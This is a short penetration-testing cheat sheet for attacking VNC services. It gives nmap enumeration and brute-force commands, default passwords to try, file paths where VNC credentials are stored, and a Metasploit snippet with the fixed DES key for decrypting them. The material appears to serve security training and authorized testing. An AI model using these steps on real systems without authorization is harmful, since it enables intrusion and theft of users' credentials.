# VNC (5900)

!!! tip "Start here"
    Try connecting with no password first: `vncviewer 10.10.10.10`. Many VNC installs on internal networks have no authentication or use weak passwords. Brute force is fast — start with `password`, `1234`, `admin`, `vnc`.

---

## Enumeration

```bash
nmap -p 5900-5910 --script vnc-info,vnc-brute 10.10.10.10
```

VNC can run on multiple displays — 5900 is display :0, 5901 is :1, etc. Scan the range.

---

## Connect

```bash
vncviewer 10.10.10.10
vncviewer 10.10.10.10:5901
```

## Credential Locations

If you have shell access on the target, VNC passwords are stored obfuscated (DES, fixed key) and are trivially decryptable:

```bash
# Common locations
~/.vnc/passwd
/root/.vnc/passwd
/home/*/.vnc/passwd
```

Decrypt with:

```bash
msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt(File.read('/root/.vnc/passwd'), fixedkey).unpack('Z*').first
```

!!! tip "Real-world"
    VNC is common on internal networks for sysadmin remote access. It gives you a full GUI desktop session — you can see everything the user has open, access credential managers, and pivot from there without dropping any tools. Check for sessions on developer machines and servers where RDP may be blocked.
